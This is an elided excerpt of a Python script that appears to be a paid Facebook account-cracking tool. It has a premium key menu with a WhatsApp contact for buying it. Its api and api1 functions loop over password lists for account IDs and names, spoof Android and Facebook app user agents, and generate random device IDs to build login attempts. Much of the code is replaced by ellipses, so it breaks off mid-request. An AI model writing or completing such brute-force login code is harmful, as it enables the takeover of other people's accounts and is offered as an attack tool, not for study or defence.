...
print('\n\033[1;97m [•] checking update 10.10 \n wait a few sec...')
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        print(f" \033[1;97mYour Key : {Ibrahim}")
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+8801307213545&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi Ibrahim Sir, I Need To Buy Your Paid Sk PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                ua = "[Mozilla/5.0 (Linux; Android 13; SM-S908E Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104]"
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua = "[Mozilla/5.0 (Linux; Android 11; moto g(10) power Build/RRBS31.Q1-3-34-1-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
